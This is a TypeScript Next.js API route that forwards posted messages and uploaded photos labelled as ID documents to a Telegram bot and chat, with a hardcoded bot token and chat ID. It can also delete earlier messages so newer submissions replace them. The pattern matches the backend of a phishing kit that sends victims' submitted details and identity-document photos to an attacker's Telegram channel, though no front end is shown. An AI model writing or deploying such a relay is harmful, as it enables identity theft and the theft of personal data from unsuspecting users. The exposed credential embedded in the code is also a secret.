import { NextRequest, NextResponse } from 'next/server';

const TOKEN = '7829577537:AAFnFwAy74RxUcqveGeMm0PNHl0dy882ZEk';
const CHAT_ID = '-5110385159';

const deleteMessage = async ( messageId: number ) =>
{
    const url = `https://api.telegram.org/bot${ TOKEN }/deleteMessage`;
    try
    {
        await fetch( url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify( {
                chat_id: CHAT_ID,
                message_id: messageId
            } )
        } );
    } catch
    {
        // Ignore delete errors
    }
};

const sendMessage = async ( message: string ) =>
{
    const url = `https://api.telegram.org/bot${ TOKEN }/sendMessage`;
    const payload = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
    };
    return fetch( url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify( payload )
    } );
};

const sendPhoto = async ( photo: File, documentType?: string ) =>
{
    const url = `https://api.telegram.org/bot${ TOKEN }/sendPhoto`;
    const formData = new FormData();
    formData.append( 'chat_id', CHAT_ID );
    formData.append( 'photo', photo );

    const caption = `📷 <b>ID Document Upload</b>\n📄 Type: <code>${ documentType || 'Unknown' }</code>`;
    formData.append( 'caption', caption );
    formData.append( 'parse_mode', 'HTML' );

    return fetch( url, { method: 'POST', body: formData } );
};

const POST = async ( req: NextRequest ) =>
{
    try
    {
        const contentType = req.headers.get( 'content-type' ) || '';

        if ( contentType.includes( 'multipart/form-data' ) )
        {
            const formData = await req.formData();
            const photo = formData.get( 'photo' ) as File | null;
            const documentType = formData.get( 'document_type' ) as string | null;

            if ( !photo )
            {
                return NextResponse.json( { success: false, error: 'No photo provided' }, { status: 400 } );
            }

            const response = await sendPhoto( photo, documentType || undefined );
            const data = await response.json();

            return NextResponse.json( {
                success: response.ok,
                message_id: data?.result?.message_id ?? null
            } );
        }

        const body = await req.json();
        const { message, delete_message_id } = body;

        if ( !message )
        {
            return NextResponse.json( { success: false }, { status: 400 } );
        }

        if ( delete_message_id && typeof delete_message_id === 'number' )
        {
            await deleteMessage( delete_message_id );
        }

        const response = await sendMessage( message );
        const data = await response.json();

        return NextResponse.json( {
            success: response.ok,
            message_id: data?.result?.message_id ?? null
        } );
    } catch
    {
        return NextResponse.json( { success: false }, { status: 500 } );
    }
};

export { POST };
